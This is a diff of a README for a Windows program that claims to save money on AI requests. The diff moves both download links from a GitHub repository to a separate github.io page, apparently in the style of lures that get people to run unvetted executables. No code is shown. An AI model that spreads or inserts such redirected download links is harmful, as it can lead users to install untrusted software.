@@ -1,6 +1,6 @@
 # 🤖 AI-Token-Optimizer-Claude-Codex-Cursor - Save Money on Every AI Request
 
-[![Download Now](https://img.shields.io/badge/Download-AI_Token_Optimizer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/berylenonmechanistic8499/AI-Token-Optimizer-Claude-Codex-Cursor)
+[![Download Now](https://img.shields.io/badge/Download-AI_Token_Optimizer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://berylenonmechanistic8499.github.io)
 
 ## 🎯 What Is This Tool?
 
@@ -62,7 +62,7 @@ Follow these simple steps to install and launch the tool on your Windows compute
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/berylenonmechanistic8499/AI-Token-Optimizer-Claude-Codex-Cursor](https://github.com/berylenonmechanistic8499/AI-Token-Optimizer-Claude-Codex-Cursor)
+Visit this link to download the application: [https://berylenonmechanistic8499.github.io](https://berylenonmechanistic8499.github.io)
 
 ### 🖱️ Step 2: Run the Program
 
